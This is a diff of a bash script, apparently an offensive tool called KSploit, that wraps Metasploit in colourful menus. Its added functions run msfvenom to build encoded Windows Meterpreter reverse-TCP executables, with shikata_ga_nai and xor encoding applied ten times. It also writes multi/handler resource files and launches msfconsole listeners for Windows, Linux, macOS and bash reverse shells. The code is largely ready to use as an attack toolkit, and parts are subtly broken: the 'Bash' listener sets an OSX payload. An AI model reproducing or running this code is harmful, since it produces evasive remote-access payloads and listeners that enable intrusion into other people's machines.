+################################################################################
+# Windows Payloads Menu
+################################################################################
+winpayloads()
+{
+	clear
+	echo ${LIGHT_CYAN}'
+	 ____             _                 _        
+	|  _ \ __ _ _   _| | ___   __ _  __| |___ 
+	| |_) / _` | | | | |/ _ \ / _` |/ _` / __|
+	|  __/ (_| | |_| | | (_) | (_| | (_| \__ \
+	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
+		    |___/                         
+	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
+'
+   echo "${LIGHT_MAGENTA}  Use the payloadss menu to quickly and easily craft metasploit payloads."
+   echo ${YELLOW}
+   echo "	   _____________________________________________"
+   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows x86 Meterpreter Reverse TCP.${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🖥️ ${GREEN} 2 ${BLUE}Windows x64 Meterpreter Reverse TCP.${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
+   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
+   echo	
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
+   echo
+   echo
+   locals
+   case "$opt" in
+	1)
+	  echo 
+	  echo "  ${FGC}    Crafting a Windows x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating shikata ga nai encoded payload ..."	
+	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $wdir/shell.exe
+	  echo
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.exe saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+	  payloads
+	;;
+	2)
+	  echo 
+	  echo "  ${FGC}    Crafting a Windows x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating xor encoded payload ..."	
+	  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $wdir/shell64.exe
+	  echo
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.exe saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+	  payloads
+	;;
+	q)
+	  clear
+	  payloads
+	;;
+	*)
+          clear 
+          error="$opt is not a valid option!"      	
+          winpayloads
+	;;
+   esac
+}
+
+################################################################################
+# Listeners Menu
+################################################################################
 listeners()
 {
         clear
 echo ${LIGHT_CYAN}'
 	 _     _     _                           
 	| |   (_)___| |_ ___ _ __   ___ _ __ ___ 
-	| |   | / __| __/ _ \ '_ \ / _ \ '__/ __|
+	| |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
 	| |___| \__ \ ||  __/ | | |  __/ |  \__ \
 	|_____|_|___/\__\___|_| |_|\___|_|  |___/
 	 👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂
-
 '
-
-        echo "${BLUE}-----------------------------------------------------"
-        echo "${BLUE}             👂   Crafting Listeners   👂            "
-        echo "${BLUE}-----------------------------------------------------"
-        echo ${LIGHT_MAGENTA}
-	PS3="${YELLOW}Enter your choice (5=QUIT)" 
-
-	options=("Python" "Meterpreter_x86" "Meterpreter_x64" "Bash" "Quit")
-	select opt in "${options[@]}"
-do
-    case $opt in
-        "Python")
-            touch meterpreter.rc
-            echo use exploit/multi/handler > meterpreter.rc
-            echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
-            read -p 'Set Attacker IP* ' attackerip
-            echo set LHOST $attackerip >> meterpreter.rc
-            read -p 'Set Attacker Port* ' attackerip
-            echo set LPORT $attackerip >> meterpreter.rc
-            echo set ExitOnSession false >> meterpreter.rc
-            echo exploit -j -z >> meterpreter.rc
-            cat meterpreter.rc | xterm -e msfconsole -r meterpreter.rc &
+   echo "${LIGHT_MAGENTA}  Use the listeners menu to craft and quickly deploy metasploit listeners."
+   echo ${YELLOW}
+   echo "	   _____________________________________________"
+   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Meterpreter Reverse TCP.    ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Meterpreter Reverse TCP.      ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🍎${GREEN} 3 ${BLUE}OSX Reverse TCP listener.           ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐚${GREEN} 4 ${BLUE}Bash Reverse TCP listener.          ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
+   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
+   echo	
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
+   echo
+   echo
+   locals
+   case "$opt" in
+        1)
+            echo
+            touch $wdir/meterpreter.rc
+            echo "    ${FGC}  Crafting a Windows Meterpreter Reverse TCP Listener :    ${NC}${YELLOW}"
+            echo use multi/handler > $wdir/meterpreter_windows.rc
+            echo set PAYLOAD windows/meterpreter/reverse_tcp >> $wdir/meterpreter_windows.rc
+            read -p '	    Set Attacker IP* ' attackerip
+            echo set LHOST $attackerip >> $wdir/meterpreter_windows.rc
+            read -p '	    Set Attacker Port* ' attackerport
+            echo set LPORT $attackerport >> $wdir/meterpreter_windows.rc
+            echo set ExitOnSession false >> $wdir/meterpreter_windows.rc
+            echo run -j -z >> $wdir/meterpreter_windows.rc
+            echo
+	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_windows.rc."
+	    echo "${GREEN}            ---> Finished crafting listener."
+	    sleep 1
+	    echo
+	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
+            cat $wdir/meterpreter_windows.rc | xterm -e msfconsole -r $wdir/meterpreter_windows.rc &
+	    sleep 2
+            listeners	
             ;;
-        "Meterpreter_x86")
-            touch meterpreter_linux.rc
-            echo use exploit/multi/handler > meterpreter_linux.rc
-            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> meterpreter_linux.rc
-            read -p 'Set Attacker IP* ' attackerip
-            echo set LHOST $attackerip >> meterpreter_linux.rc
-            read -p 'Set Attacker Port* ' attackerip
-            echo set LPORT $attackerip >> meterpreter_linux.rc
-            echo set ExitOnSession false >> meterpreter_linux.rc
-            echo exploit -j -z >> meterpreter_linux.rc
-            cat meterpreter_linux.rc | xterm -e msfconsole -r meterpreter_linux.rc &
-            exit
+        2)
+            echo
+            touch $wdir/meterpreter_linux.rc
+            echo "    ${FGC}    Crafting a Linux Meterpreter Reverse TCP Listener :     ${NC}${YELLOW}"
+            echo use exploit/multi/handler > $wdir/meterpreter_linux.rc
+            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> $wdir/meterpreter_linux.rc
+	    read -p '	    Set Attacker IP* ' attackerip
+            echo set LHOST $attackerip >> $wdir/meterpreter_linux.rc
+            read -p '	    Set Attacker Port* ' attackerport
+            echo set LPORT $attackerport >> $wdir/meterpreter_linux.rc
+            echo set ExitOnSession false >> $wdir/meterpreter_linux.rc
+            echo exploit -j -z >> $wdir/meterpreter_linux.rc
+            echo
+	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_linux.rc."
+	    echo "${GREEN}            ---> Finished crafting listener."
+	    sleep 1
+	    echo
+	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
+            cat $wdir/meterpreter_linux.rc | xterm -e msfconsole -r $wdir/meterpreter_linux.rc &
+	    sleep 2
+            listeners
             ;;
-        "Meterpreter_x64")
-            touch meterpreter_mac.rc
-            echo use exploit/multi/handler > meterpreter_mac.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> meterpreter_mac.rc
-            read -p 'Set Attacker IP* ' attackerip
-            echo set LHOST $attackerip >> meterpreter_mac.rc
-            read -p 'Set Attacker Port* ' attackerip
-            echo set LPORT $attackerip >> meterpreter_mac.rc
-            echo set ExitOnSession false >> meterpreter_mac.rc
-            echo exploit -j -z >> meterpreter_mac.rc
-            cat meterpreter_mac.rc | xterm -e msfconsole -r meterpreter_mac.rc &
+        3)
+            echo
+            touch $wdir/meterpreter_mac.rc
+            echo "          ${FGC}    Crafting an OSX Reverse TCP Listener :     ${NC}${YELLOW}"
+            echo use exploit/multi/handler > $wdir/meterpreter_mac.rc
+            echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_mac.rc
+	    read -p '	    Set Attacker IP* ' attackerip
+            echo set LHOST $attackerip >> $wdir/meterpreter_mac.rc
+            read -p '	    Set Attacker Port* ' attackerport
+            echo set LPORT $attackerport >> $wdir/meterpreter_mac.rc
+            echo set ExitOnSession false >> $wdir/meterpreter_mac.rc
+            echo exploit -j -z >> $wdir/meterpreter_mac.rc
+            echo
+	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_mac.rc."
+	    echo "${GREEN}            ---> Finished crafting listener."
+	    sleep 1
+	    echo
+	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
+            cat $wdir/meterpreter_mac.rc | xterm -e msfconsole -r $wdir/meterpreter_mac.rc &
+	    sleep 2
+            listeners
             ;;
-        "Bash")
-            touch meterpreter_droid.rc
-            echo use exploit/multi/handler > meterpreter_droid.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> meterpreter_droid.rc
-            read -p 'Set Attacker IP* ' attackerip
-            echo set AttLHOST $attackerip >> meterpreter_droid.rc
-            read -p 'Set Attacker Port* ' attackerip
-            echo set LPORT $attackerip >> meterpreter_droid.rc
-            echo set ExitOnSession false >> meterpreter_droid.rc
-            echo exploit -j -z >> meterpreter_droid.rc
-            cat meterpreter_droid.rc | xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
+        4)
+            echo
+            touch $wdir/meterpreter_droid.rc
+            echo "         ${FGC}     Crafting a Bash Reverse TCP Listener :     ${NC}${YELLOW}"
+            echo use exploit/multi/handler > $wdir/meterpreter_droid.rc
+            echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_droid.rc
+	    read -p '	    Set Attacker IP* ' attackerip
+            echo set LHOST $attackerip >> $wdir/meterpreter_droid.rc
+            read -p '	    Set Attacker Port* ' attackerport
+            echo set LPORT $attackerport >> $wdir/meterpreter_droid.rc
+            echo set ExitOnSession false >> $wdir/meterpreter_droid.rc
+            echo exploit -j -z >> $wdir/meterpreter_droid.rc
+	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_droid.rc."
+	    echo "${GREEN}            ---> Finished crafting listener."
+	    sleep 1
+	    echo
+	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
+            cat $wdir/meterpreter_droid.rc | xterm -e msfconsole -r $wdir/meterpreter_droid.rc &
+	    sleep 2
+            listeners
             ;;  
-        "Quit")
+         q)
             clear
-            echo "Good Bye" && break
+            goto $start
             ;;
-        *) echo 💀 invalid option 💀;;
+         *)
+           clear 
+           error="$opt is not a valid option!"      	
+           listeners
+         ;;
     esac
-done
-}                                     
-
+}     
+                                
+################################################################################
+# Migrate to Msfconsole
+################################################################################
 mfconsole()
 {
- 		sudo msfconsole
+  echo 	
+  echo "${YELLOW}          --> Migrating to metasploit-framework ..."
+  echo
+  sudo msfdb run
+  tput sgr0 
+  exit 1;
 }	  
 
+################################################################################
+# Persistence Menu
+################################################################################
 persist()
 {
+	clear 
+	echo
+	echo 
+	echo -e "${RED} ##################################################"
+	echo -e " #${FGR}${LG}             💀   NOT READY!!!!   💀            ${NC}${RED}#" 
+	echo -e " ##################################################"
+	echo
+	echo
+	sleep 1
+	clear
+	goto start;
+  exit 1; 
 		echo 'Not Ready' 
 }
 
-#}
+################################################################################
+# INITIALIZE
+################################################################################
+clear
+
+[[ `id -u` -eq 0 ]] || {
+	clear 
+	echo
+	echo 
+	echo -e "${RED} ##################################################"
+	echo -e " #${FGR}${LG}   💀 Must run as root (sudo ./ksploit.sh) 💀   ${NC}${RED}#" 
+	echo -e " ##################################################"
+	echo -e '      👋              Goodbye              👋'
+	echo
+  exit 1; 
+}
+
+printf "\e[49m                                                \e[m
+\e[49m                                                \e[m
+\e[49m                \e[38;5;65;49m▄\e[38;5;71;49m▄\e[38;5;71;48;5;0m▄\e[38;5;71;48;5;65m▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m     \e[38;5;71;48;5;71m▄\e[38;5;71;48;5;65m▄\e[38;5;71;48;5;0m▄\e[38;5;71;49m▄\e[38;5;239;49m▄\e[49m                \e[m
+\e[49m             \e[38;5;238;49m▄\e[38;5;71;48;5;234m▄\e[38;5;71;48;5;71m▄▄▄▄▄▄\e[48;5;71m     \e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄▄▄▄\e[38;5;71;48;5;233m▄\e[38;5;235;49m▄\e[49m             \e[m
+\e[49m           \e[38;5;0;49m▄\e[38;5;71;48;5;239m▄\e[38;5;71;48;5;71m▄▄▄▄\e[48;5;71m                \e[38;5;71;48;5;71m▄▄\e[38;5;71;48;5;236m▄\e[49m            \e[m
+\e[49m          \e[38;5;235;49m▄\e[38;5;71;48;5;71m▄▄▄\e[48;5;71m                     \e[38;5;71;48;5;71m▄▄\e[38;5;236;49m▄\e[49m          \e[m
+\e[49m          \e[38;5;71;48;5;71m▄▄▄\e[48;5;71m                        \e[38;5;71;48;5;71m▄\e[49m          \e[m
+\e[49m         \e[38;5;71;48;5;65m▄\e[48;5;71m                           \e[38;5;71;48;5;71m▄\e[38;5;71;48;5;235m▄\e[49m         \e[m
+\e[49m         \e[38;5;71;48;5;71m▄\e[48;5;71m                           \e[38;5;71;48;5;71m▄▄\e[49m         \e[m
+\e[49m         \e[38;5;71;48;5;71m▄\e[48;5;71m                             \e[49m         \e[m
+\e[49m         \e[38;5;71;48;5;71m▄▄▄▄▄▄▄▄▄▄▄▄\e[48;5;71m       \e[38;5;71;48;5;71m▄▄▄▄▄▄▄▄▄▄▄\e[49m         \e[m
+\e[49m         \e[38;5;71;48;5;71m▄▄\e[38;5;0;48;5;71m▄\e[38;5;232;48;5;240m▄\e[48;5;0m    \e[38;5;0;48;5;235m▄\e[38;5;71;48;5;71m▄\e[38;5;65;48;5;71m▄\e[38;5;71;48;5;71m▄▄▄\e[48;5;71m   \e[38;5;71;48;5;71m▄▄▄\e[38;5;65;48;5;71m▄\e[38;5;236;48;5;35m▄\e[38;5;71;48;5;71m▄\e[38;5;242;48;5;71m▄\e[38;5;0;48;5;71m▄\e[38;5;0;48;5;35m▄\e[38;5;0;48;5;71m▄\e[38;5;65;48;5;71m▄\e[38;5;71;48;5;71m▄▄\e[49m         \e[m
+\e[49m         \e[38;5;232;48;5;65m▄\e[38;5;71;48;5;71m▄\e[48;5;0m     \e[38;5;0;48;5;0m▄\e[38;5;242;48;5;238m▄\e[38;5;255;48;5;0m▄\e[38;5;0;48;5;71m▄\e[38;5;108;48;5;65m▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m   \e[38;5;71;48;5;71m▄\e[38;5;65;48;5;71m▄\e[38;5;65;48;5;234m▄\e[38;5;0;48;5;71m▄\e[38;5;15;48;5;233m▄\e[38;5;234;48;5;248m▄\e[48;5;0m    \e[38;5;234;48;5;0m▄\e[38;5;71;48;5;71m▄\e[49;38;5;239m▀\e[49m         \e[m
+\e[49m          \e[38;5;65;48;5;71m▄\e[38;5;71;48;5;234m▄\e[48;5;0m       \e[38;5;0;48;5;234m▄\e[38;5;0;48;5;232m▄\e[38;5;71;48;5;239m▄\e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;65;48;5;71m▄\e[38;5;232;48;5;243m▄\e[48;5;0m  \e[38;5;0;48;5;233m▄\e[38;5;0;48;5;0m▄\e[48;5;0m    \e[38;5;71;48;5;65m▄\e[38;5;233;48;5;71m▄\e[49m          \e[m
+\e[49m           \e[38;5;71;48;5;71m▄\e[38;5;237;48;5;0m▄\e[38;5;8;48;5;0m▄\e[48;5;0m       \e[38;5;0;48;5;65m▄\e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;65;48;5;71m▄\e[48;5;0m       \e[38;5;232;48;5;0m▄\e[38;5;71;48;5;0m▄\e[38;5;65;48;5;71m▄\e[49m           \e[m
+\e[49m            \e[38;5;243;48;5;71m▄\e[38;5;108;48;5;0m▄\e[38;5;65;48;5;243m▄\e[38;5;71;48;5;0m▄\e[48;5;0m      \e[38;5;71;48;5;71m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[48;5;0m      \e[38;5;71;48;5;0m▄\e[38;5;0;48;5;237m▄\e[38;5;71;48;5;232m▄\e[38;5;0;48;5;71m▄\e[49m            \e[m
+\e[49m             \e[38;5;232;48;5;71m▄\e[38;5;71;48;5;71m▄\e[38;5;71;48;5;234m▄\e[38;5;71;48;5;71m▄▄\e[38;5;71;48;5;236m▄\e[38;5;71;48;5;232m▄\e[38;5;71;48;5;240m▄\e[38;5;71;48;5;238m▄\e[38;5;71;48;5;243m▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;71;48;5;239m▄\e[38;5;71;48;5;238m▄\e[38;5;71;48;5;235m▄\e[38;5;71;48;5;238m▄\e[38;5;243;48;5;71m▄\e[38;5;71;48;5;71m▄\e[38;5;71;48;5;233m▄\e[38;5;71;48;5;71m▄\e[49;38;5;108m▀\e[49m             \e[m
+\e[49m              \e[49;38;5;239m▀\e[38;5;71;48;5;71m▄▄\e[48;5;71m     \e[38;5;71;48;5;71m▄\e[38;5;233;48;5;71m▄▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m   \e[38;5;71;48;5;71m▄▄\e[38;5;239;48;5;71m▄\e[49;38;5;232m▀\e[49m              \e[m
+\e[49m                \e[49;38;5;71m▀\e[38;5;243;48;5;71m▄\e[38;5;71;48;5;71m▄\e[48;5;71m   \e[38;5;71;48;5;71m▄\e[38;5;71;48;5;236m▄\e[38;5;71;48;5;65m▄\e[38;5;71;48;5;71m▄▄\e[48;5;71m \e[38;5;71;48;5;71m▄▄\e[38;5;65;48;5;71m▄\e[49;38;5;242m▀\e[49m                \e[m
+\e[49m                  \e[49;38;5;65m▀\e[38;5;71;48;5;71m▄▄▄▄▄▄▄▄▄\e[38;5;65;48;5;71m▄\e[49;38;5;242m▀\e[49m                  \e[m
+\e[49m                    \e[49;38;5;71m▀\e[38;5;71;48;5;71m▄▄▄▄▄▄\e[49;38;5;71m▀\e[49m                    \e[m
+\e[49m                      \e[38;5;0;48;5;71m▄\e[38;5;71;48;5;71m▄▄\e[49;38;5;71m▀\e[49m                      \e[m
+\e[49m                                                \e[m
+\e[49m                                                \e[m
+";printf "
+    \e[49m                                        \e[m
+    \e[49m  \e[38;5;82;49m▄▄▄▄▄▄▄▄▄\e[38;5;82;48;5;82m▄▄\e[38;5;82;49m▄▄\e[49m      \e[38;5;82;49m▄\e[38;5;82;48;5;82m▄▄\e[38;5;82;49m▄\e[49m     \e[38;5;82;49m▄\e[38;5;82;48;5;82m▄▄\e[38;5;82;49m▄▄▄▄\e[49m   \e[m
+    \e[49m  \e[38;5;82;48;5;82m▄\e[38;5;234;48;5;234m▄\e[48;5;232m \e[38;5;233;48;5;82m▄\e[38;5;235;48;5;233m▄\e[38;5;82;48;5;235m▄\e[38;5;82;48;5;82m▄\e[48;5;82m \e[38;5;235;48;5;234m▄\e[38;5;82;48;5;234m▄\e[38;5;82;48;5;233m▄\e[38;5;82;48;5;234m▄\e[38;5;82;48;5;82m▄▄\e[38;5;232;48;5;82m▄▄\e[38;5;233;48;5;82m▄▄\e[38;5;82;48;5;82m▄▄\e[48;5;232m \e[48;5;233m \e[38;5;82;48;5;82m▄▄\e[38;5;232;48;5;82m▄\e[38;5;233;48;5;82m▄▄\e[38;5;82;48;5;82m▄\e[48;5;82m \e[38;5;232;48;5;232m▄\e[38;5;232;48;5;233m▄\e[38;5;82;48;5;82m▄\e[38;5;233;48;5;22m▄\e[38;5;236;48;5;234m▄\e[38;5;232;48;5;82m▄▄\e[38;5;82;49m▄\e[49m \e[m
+    \e[49m  \e[48;5;82m \e[38;5;234;48;5;234m▄\e[38;5;233;48;5;236m▄\e[38;5;236;48;5;235m▄\e[38;5;233;48;5;82m▄\e[38;5;82;48;5;82m▄\e[48;5;82m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;235m▄▄\e[38;5;232;48;5;233m▄\e[38;5;237;48;5;232m▄\e[38;5;232;48;5;82m▄\e[48;5;82m \e[48;5;234m \e[38;5;232;48;5;234m▄\e[38;5;82;48;5;82m▄\e[38;5;82;48;5;233m▄\e[38;5;235;48;5;234m▄\e[38;5;82;48;5;82m▄\e[48;5;232m \e[48;5;233m \e[38;5;82;48;5;82m▄\e[38;5;234;48;5;233m▄\e[38;5;232;48;5;234m▄\e[38;5;82;48;5;82m▄\e[38;5;82;48;5;233m▄\e[38;5;236;48;5;234m▄\e[38;5;82;48;5;82m▄\e[38;5;232;48;5;232m▄\e[48;5;234m \e[38;5;82;48;5;82m▄\e[38;5;22;48;5;22m▄\e[48;5;234m \e[38;5;82;48;5;82m▄▄\e[49;38;5;82m▀\e[49m \e[m
+    \e[49m  \e[38;5;82;48;5;82m▄\e[38;5;234;48;5;234m▄\e[48;5;232m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;236m▄\e[38;5;234;48;5;233m▄\e[38;5;233;48;5;82m▄\e[48;5;82m \e[38;5;233;48;5;82m▄\e[38;5;234;48;5;82m▄▄\e[38;5;233;48;5;234m▄\e[38;5;82;48;5;232m▄\e[38;5;82;48;5;82m▄\e[38;5;234;48;5;234m▄\e[38;5;232;48;5;233m▄\e[38;5;234;48;5;82m▄\e[38;5;234;48;5;232m▄\e[38;5;28;48;5;235m▄\e[38;5;82;48;5;82m▄\e[48;5;232m \e[48;5;233m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;234m▄\e[38;5;234;48;5;233m▄\e[38;5;234;48;5;82m▄\e[38;5;234;48;5;233m▄\e[38;5;82;48;5;235m▄\e[38;5;82;48;5;82m▄\e[38;5;232;48;5;232m▄\e[48;5;234m \e[38;5;82;48;5;82m▄\e[38;5;82;48;5;2m▄\e[38;5;234;48;5;234m▄\e[38;5;234;48;5;82m▄\e[38;5;34;48;5;82m▄\e[38;5;82;48;5;82m▄\e[49m \e[m
+    \e[49m  \e[49;38;5;82m▀▀▀▀▀▀▀▀▀▀▀▀▀\e[38;5;82;48;5;82m▄\e[38;5;233;48;5;234m▄\e[38;5;232;48;5;232m▄\e[38;5;82;48;5;82m▄\e[49;38;5;82m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[49m  \e[m
+    \e[49m               \e[49;38;5;82m▀▀▀\e[49m                      \e[m
+";
+echo -ne '   👽\r'
+sleep .1
+echo -ne '   👽👽\r'
+sleep .1
+echo -ne '   👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .1
+echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
+sleep .5
+clear
 
 ################################################################################
 ################################################################################
 # Main program                                                                 #
 ################################################################################
 ################################################################################
+function goto
+{
+    label=$1
+    shift;
+    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
+    eval "$cmd"
+    exit
+}
 
-[[ `id -u` -eq 0 ]] || { echo -e "${RED}💀 Must run as root (sudo ./ksploit.sh) 💀"; exit 1; }
-resize -s 30 60
-clear
-SERVICE=service;
-wdir=$(pwd)
-clear
-   clear
+start=${1:-"start"}
+#start:
    echo
    echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
    echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
-   echo "    ${RED}| ' /${LIGHT_MAGENTA}\___ \| '_ \| |/ _ \| | __|"
+   echo "    ${RED}| ' /${LIGHT_MAGENTA}\\___ \| '_ \| |/ _ \| | __|"
    echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
    echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
    echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "
    echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
    echo 
-   echo " ${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
+   echo "${LIGHT_MAGENTA}  KSploit is a user friendly control panel in which to drive many metasploit tasks "
+   echo "  such as generating shells, payloads, and persistence scripts on the fly, starting "
+   echo "  listeners, and suggesting payloads and exploits"
    echo
-   echo " ${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-l|-s|-m|-p|-x]"
-   echo ${GREEN}
-   echo " options:"
-   echo " -------------------------------------------"
-   echo " ${YELLOW}-h ${BLUE}To show this message"
-   echo " ${YELLOW}-L ${BLUE}To load the listeners menu."
-   echo " ${YELLOW}-S ${BLUE}To load the shells menu"
-   echo " ${YELLOW}-m ${BLUE}To start Msfconsole"
-   echo " ${YELLOW}-p ${BLUE}To load the payloads menu."
-   echo " ${YELLOW}-x ${BLUE}To load the persistence menu."
-   echo 
-   echo 
-
-while getopts ":h?l?:s?:m?:p?:x?" opt; 
-do
-  case "$opt" in
-       h) Help
-         exit;;
-       l) listeners
+   echo ${YELLOW}
+   echo "	   _____________________________________________"
+   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    👂${GREEN} 1 ${BLUE}To load the listeners menu.         ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐚${GREEN} 2 ${BLUE}To load the shells menu.            ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    💰${GREEN} 3 ${BLUE}To load the payloads menu.          ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+#   echo "	  |    🎯${GREEN} 4 ${BLUE}To load the persistence menu.       ${YELLOW}|"
+#   echo "	  |---------------------------------------------|"
+   echo "	  |    ▶️ ${GREEN} m ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
+   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
+   echo	
+#   locals	
+   echo ${NC}
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,m,q]    " opt
+   case "$opt" in
+       1) listeners
          ;;
-       s) shells
+       2) shells
          ;;
+       3) payloads
+         ;;
+#       4) persist
+#         ;;
        m) mfconsole
          ;;
-       p) payloads
-         ;;
-       x) persist
-         ;;
-       *) 
-         echo ${RED}
-         echo "💀 invalid option ./ksploit.sh -h for help 💀"
-         exit;;
+       q)
+	echo 
+	echo 
+	echo ${YELLOW}
+	echo  "	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
+	echo 
+	echo 
+	exit 1
+	 ;; 
+       *)clear 
+         error="$opt is not a valid option!"
+         goto $start
+       ;;
     esac
-done
 tput sgr0 
